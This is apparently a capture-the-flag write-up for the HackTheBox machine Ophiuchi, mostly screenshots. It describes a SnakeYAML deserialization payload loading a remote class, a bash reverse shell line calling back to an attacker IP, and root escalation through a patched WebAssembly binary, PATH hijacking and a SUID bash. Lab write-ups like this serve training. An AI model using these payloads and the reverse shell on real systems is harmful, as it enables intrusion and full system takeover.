# HackTheBox-Ophiuchi

## Rustscan

```bash

rustscan -a 10.10.10.227 -- -A -sC -sV             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

Open 10.10.10.227:22
Open 10.10.10.227:8080

PORT     STATE SERVICE REASON         VERSION                                                                     
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)                
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 9.0.38
| http-methods:                                          
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
```

## PORT 8080 (HTTP)

<img src="https://imgur.com/nzuPNKS.png"/>

There's a YAML parser so I tried to write something there but got no response

<img src="https://imgur.com/iLjUXuF.png"/>

<img src="https://imgur.com/NuZr8ru.png"/>

From the nmap scan we already know that  Apache Tomcat 9.0.38 is running ,so I logging in by going to `/manager` ,but wasn't able to login using the default credentials

<img src="https://imgur.com/ubAjejr.png"/>

<img src="https://imgur.com/1uzKvVg.png"/>


So after googling for apache tomcat 9.0.38 vulnerabilites/exploits I found snake yaml deserilization exploit

<img src="https://imgur.com/FSSX0qu.png"/>

The exploit is about Snake YAML having a feature to call a java class constructor

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://VPN_IP/"]
  ]]
]
```

<img src="https://imgur.com/ddbSFav.png"/>

We'll see a request being made for 
`/METAINF/services/javax.script.ScriptEngineFactory` on our machine 

<img src="https://imgur.com/p7MYzlv.png"/>

We can abuse it in a way that keeping the same file structure like having directory 'META-IN' then a sub directory `services` having a file name `javax.script.ScriptEngineFactory` and in that file we will call our exploit

<img src="https://imgur.com/wI94hDk.png"/>

<img src="https://imgur.com/UPf66oB.png"/>

Create a file name `exploit.java` you can get the java code from here and in that we'll try to ping our local machine to see if the exploit works or not so that we can get a reverse shell

https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java

<img src="https://imgur.com/FhdLmnb.png"/>

Compile the java file using `javac` and you will get .class file

<img src="https://imgur.com/KhonV7r.png"/>

<img src="https://i.imgur.com/2qu18Y0.png"/>

In the `javax.script.ScriptEngineFactory` we will include this content

<img src="https://imgur.com/nO3s3pB.png"/>

And also we will make a folder `snakeyml` having that `exlpoit.class` file

<img src="https://imgur.com/xQCix5Y.png"/>

So the file structure will look like this , so start the python3 server or apache2 to host the folder and use the same java class constructor we were calling yaml

<img src="https://i.imgur.com/wmpyljd.png"/>

After sending it we receive a 500 error

<img src="https://imgur.com/0DyhoA7.png"/>

We can see the error that we compiled the java file with the latest version of `javac` so we need to comiple it using the java class 55 version. We can do this by specifying the release as a paramter in javac. (Thank you stackoverflow)

<img src="https://imgur.com/nBZ6KlB.png"/>

<img src="https://imgur.com/Ul06kBs.png"/>

Now compiling it using the release version 11 and start both the python3 web server and start listening for ICMP packets on tun0 interface

<img src="https://imgur.com/Bq8Le25.png"/>

<img src="https://imgur.com/wyJNAcg.png"/>

On giving java constructor class in yaml we will see the ICMP packets

<img src="https://imgur.com/RGc29Vt.png"/>


But there was a problem in getting a reverse shell no matter which reverse shell I tried to use whether it was a bash or netcat I couldn't get a shell so I made a script which had a bash reverse shell 

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.196/4242 0>&1
```

Now we will download the bash script on the target machine using `wget` save it in `/tmp` directory and will execute it using bash also we will setup a netcat listener. So modifying our `exploit.java` file

<img src="https://imgur.com/Rm47FzX.png"/>

Enter this in yaml parser input box

<img src="https://imgur.com/r4LZIRZ.png"/>

Once you enter this on your terminal you'll see the request being made to get `exploit.sh` and you will get a reverse shell

<img src="https://imgur.com/MLLPoav.png"/>

Stabilizing the shell using `python3`

<img src="https://imgur.com/uQrLdPw.png"/>

Since apache tomcat is running we can now search for users file 

<img src="https://imgur.com/zlIlSkR.png"/>

<img src="https://imgur.com/5PH5uC3.png"/>

Now using find command to search for that file

<img src="https://imgur.com/MsjhO2j.png"/>

<img src="https://i.imgur.com/He84Vda.png"/>

We can try to switch user as `admin` with that password on the machine

<img src="https://imgur.com/5N7BYYz.png"/>

Reading the source code we can see that it's going to read the Web assembly binary then it's going to get a value from `info` function and if that value it's not equal to 1 the program will give the ouput "Not ready to deploy" else it would execute a `deploy.sh` script.

<img src="https://imgur.com/Bq2pwMT.png"/>

There is one thing to note that `main.wasm` and `deploy.sh` don't have the absolute path in the source meaning we can make our own files and then play around with the PATH variable. So first I am going to download `main.wasm` on to my machine 

<img src="https://imgur.com/X9vGDib.png"/>


https://github.com/WebAssembly/wabt

And here will be using a tool named `WABT` Web Assembly Binary Toolkit , we need to convert the main.wasm file to .wat file as it is a text format to that binary. But before that first let's see the `info` function in the binary using wasm-decompile which will decompile the binary to C syntax 

<img src="https://imgur.com/wIXUs4r.png"/>

<img src="https://imgur.com/8Jp2bDH.png"/>

We can see that `info` function returns the value 0 so that's what we need to change. Converting .wasm to .wat file

<img src="https://imgur.com/bwKvBmO.png"/>

On opening the .wat file we can see that `const` value is 0

<img src="https://imgur.com/tkD8o2B.png"/>

So remeber the source code had a condition if `f!=1` (if f is not equal to 1) it's going to print not deploy else it will execute the `deploy.sh` script so change that 0 to 1

<img src="https://imgur.com/rJyXUXy.png"/>

Now we need that back in binary form (.wasm) so we are going to convert it from .wat to .wasm 

<img src="https://imgur.com/ReZxaUq.png"/>

Transfer this onto target machine in `/tmp` directory also to make a `deploy.sh` file. I added a command to make bash a SUID in that script file

<img src="https://imgur.com/DPFsf9J.png"/>

<img src="https://i.imgur.com/CrRofxq.png"/>

Now to add `/tmp` to PATH variable and run the golang source code as sudo

<img src="https://imgur.com/FMzjbeM.png"/>

<img src="https://imgur.com/ZECIkwq.png"/>

We can see that `/bin/bash` now has a SUID bit on this means we can get root by running bash with `-p`

<img src="https://imgur.com/wtFJtYN.png"/>

You can also get a reverse shell using netcat (OpenBSD)

<img src="https://imgur.com/PXj0QUn.png"/>

<img src="https://imgur.com/uQRWoFX.png"/>
